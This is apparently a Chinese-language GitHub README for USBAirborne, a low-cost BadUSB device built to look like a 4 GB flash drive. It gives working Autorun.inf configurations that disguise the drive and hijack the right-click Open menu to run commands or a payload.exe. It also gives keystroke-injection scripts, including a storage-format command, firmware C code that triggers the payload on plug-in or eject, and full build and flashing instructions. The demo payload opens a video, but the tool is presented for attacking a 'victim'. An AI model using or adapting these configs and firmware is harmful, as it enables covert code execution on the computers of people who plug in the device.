# USBAirborne

更高级的BadUSB

------

[**中文**](https://github.com/Push3AX/USBAirborne/blob/main/readme_cn.md) | [English](https://github.com/Push3AX/USBAirborne/blob/main/readme.md)

USBAirborne伪装成U盘，但当受害者将它插入电脑，它会执行指定的命令或程序。

- 支持BadUSB攻击、AutoRun攻击
- 内置4MB存储空间，可伪装为4G的U盘
- 低成本（约10元 / 个）
- 标准G2板型，可装入常见U盘外壳

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/1.png" style="zoom: 50%;" />



## Demo

USBAirborne自带一个演示Demo：

插入电脑后， USBAirborne显示为一个4G的U盘。

但在打开U盘时（包括双击打开、右键-打开、右键-在新窗口中打开），USBAirborne会自动打开浏览器播放Never Gonna Give You Up。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/autorun.gif"/>

USBAirborne攻击行为的配置文件位于根目录下的Autorun.inf。 此处所使用的Autorun.inf如下：

```ini
[AutoRun]
autoplay=true

;将驱动器图标伪装为U盘图标
icon=c:\windows\system32\shell32.dll,79

;驱动器名称
label=Nothing inside

;攻击Payload，此处为调用cmd打开网页
open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"

;劫持右键菜单
shell\open=打开(&O)
shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
shell\opennewwindow=在新窗口中打开(&E) 
shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
```



## 执行指定的程序

如果播放视频不够有趣，也可配置USBAirborne执行其他操作，例如运行指定程序。

首先,将USBAirborne的第一个开关打开，关闭攻击模式。

**只有在攻击模式关闭时，USBAirborne的根目录才可以写入文件。同时，攻击模式关闭时USBAirborne不会执行攻击内容。**

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_cn.png"/>

修改USBAirborne根目录下的Autorun.inf可实现其它攻击行为。例如运行USBAirborne根目录下的payload.exe：

```ini
[AutoRun]
autoplay=true

;将驱动器图标伪装为U盘图标
icon=c:\windows\system32\shell32.dll,79

;驱动器名称
label=Nothing inside

;攻击Payload，此处为运行根目录下的payload.exe
open=payload.exe
run=payload.exe

;劫持右键菜单
shell\open=打开(&O)
shell\open\Command=payload.exe
shell\opennewwindow=在新窗口中打开(&E) 
shell\opennewwindow\Command=payload.exe
```

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/payload.gif"/>



## BadUSB攻击

AutoRun攻击需要受害者打开U盘，如果需要更自动化，可以使用BadUSB。简而言之，BadUSB攻击通过模拟键盘的输入来执行操作。

（但BadUSB容易受到不同情况的影响，例如在锁屏或者启用中文输入法的状态，BadUSB攻击会失败）

在Autorun.inf中添加两个[badusb]，在其中编写键盘操作。

以下是一个简单的例子，通过模拟键盘按下Win+R键打开“运行”窗口，输入notepad打开记事本，并输入一些测试数据。

最后再次打开“运行”窗口，播放Never Gonna Give You Up。

```ini
[BadUSB]
[Win+R]
[Delay][Delay]
notepad[Enter]
[Delay]
Hi![Enter]
This is a test of USBAirborne[Enter]
[Win+R]
[Delay]
[Delay]
https://www.bilibili.com/video/BV1uT4y1P7CX/
[Enter]
[BadUSB]

;后续是AutoRun攻击的配置文件。USBAirborne支持同时进行两种攻击。
[AutoRun]
autoplay=true

;将驱动器图标伪装为U盘图标
icon=c:\windows\system32\shell32.dll,79

;驱动器名称
label=Nothing inside

;攻击Payload，此处为调用cmd打开网页
open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"

;劫持右键菜单
shell\open=打开(&O)
shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
shell\opennewwindow=在新窗口中打开(&E) 
shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
```

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/badusb.gif"/>



## 操作系统支持

- AutoRun攻击仅支持Windows系统，且要未完全禁止AutoRun。（Windows7及以上系统默认禁止常见设备开启AutoRun，但允许DRIVE_FIXED CD-ROM设备开启。相关的注册表项目请参考[维基百科](https://en.wikipedia.org/wiki/AutoRun#Registry_settings)）

- BadUSB攻击理论上支持所有操作系统。但不同的操作系统接收的键盘输入并不一样。例如通过Win+R打开“运行”窗口仅在Windows下可用。



## 高级利用

### BadUSB高级命令

BadUSB的配置文件支持一些组合键和高级命令：

1. [Enter]：按下回车键
2. [Shift]：按下Shift键
3. [Capslock]：切换大小写
4. [Win]：按下Win键
5. [Win+R]：打开“运行”窗口
6. [Alt+F4]：关闭当前窗口
7. [Win+D]：显示桌面
8. [Win+L]：锁定计算机
9. [Win+E]：打开Windows资源管理器
10. [Ctrl+Alt+Del]：打开安全选项
11. [Delay]：等待500毫秒
12. [Format]：格式化储存

### 编译固件

USBAirborne.uvproj目录下是USBAirborne的固件源代码。

编译需要Keil环境。在Keil安装完成后，打开[WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html)，点击 功能-添加WCH MCU到KEIL器件库。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/keil_cn.png"/>

此时使用Keil打开USBAirborne.uvproj目录下的Project.uvproj，应当可以编译USBAirborne的固件。

### 更快执行BadUSB

USBAirborne在执行BadUSB时需要从Flash中读取Payload，这一过程用时约4秒。如果希望更快地执行BadUSB，可以通过将Payload内置在固件中。

main.c中的BadUSBDemo()是一个Payload示例。修改ExecBadUSB为1，该Payload会被执行。

```c
UINT8 ExecBadUSB = 1;

void BadUSBDemo()
{
	UINT8 Payload[]="https://www.bilibili.com/video/BV1uT4y1P7CX\n";
	mDelaymS(1000);
	SendKey(KB_LeftShift, KB_NULL);	//切换输入法
	mDelaymS(500);
	SendKey(KB_LeftGUI, KB_R);
	mDelaymS(500);
	SendString(Payload,sizeof(Payload)/sizeof(Payload[0]));
	mDelaymS(500);
}

void main(void)
{
	...
	while(1)
	{
		if(ExecBadUSB == 1 && AttackEnabled == 1)
		{
			ExecBadUSB=0;
			BadUSBDemo();
		}
		mDelaymS(100);
	}
	...
}
```

### 在其它时刻执行BadUSB

BadUSB一般会在USBAirborne插入计算机后立刻执行，如果你希望在其它时刻执行，可以通过在USB的不同UFI命令中将ExecBadUSB置1实现。

例如，在USB.c的UFI_staStoUnit()中将ExecBadUSB置1，可以实现在USBAirborne被弹出时执行BadUSB Payload:

```c
void  UFI_staStoUnit(void)
{
	CH375BULKDOWN = 0;
	CH375BULKUP = 0;
	BcswStatus = 0;
	mSenseKey = 0;
	mASC = 0;
	ExecBadUSB=1; //添加此行
}
```




## 制造指南

### 硬件设计

USBAirborne的硬件设计开源在OSHWHub，请移步至：

https://oshwhub.com/PushEAX/3079905e2c434c54902d77ab60f6c747

### BOM与成本

| 元器件号 | 名称           | 封装类型            | 数量 | 总价（元） |
| -------- | -------------- | ------------------- | ---- | ---------- |
| C1,C4    | 10uF 电容      | C0603               | 2    | 0.1        |
| C2,C3    | 100nF 电容     | C0603               | 2    | 0.1        |
| R1,R2    | 22k 电阻       | R0603               | 2    | 0.1        |
| SW1      | 2Pin开关       |                     | 1    | 2          |
| U1       | CH552G         | SOP-16_L10.0-W3.9   | 1    | 3.8        |
| U2       | P25Q32H-SSH-IT | SOIC-8_L4.9-W3.9    | 1    | 2.2        |
| USB1     | USB2.0-A-公头  | USB-A-TH_USB-A-F-90 | 1    | 0.4        |

*备注：CH552G可以替换为CH551G、CH554G。P25Q32H可以被替换为其它W25Q兼容 SPI Flash，容量建议在4MB-16MB。*

### 制造步骤

如果你希望自己制作USBAirborne，以下是简要步骤：

1. 下载USBAirborne的[Gerber](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/Hardware/Gerber_PCB1_2022-06-19.zip)文件，将其发送给PCB制造商生产。

2. 参照BOM章节，焊接各个元器件。

3. 将USBAirborne的第二个开关打开，进入烧录模式。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_cn.png"/>

4. 在 [此处](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/USBAirborne.uvproj/USBAirborne_2.1.hex)下载USBAirborne的固件。使用[WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html)烧录固件。

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/WCHISPTool_cn.png"/>

5. 关闭烧录模式，打开读写模式，将Autorun.inf拷贝到USBAirborne根目录。
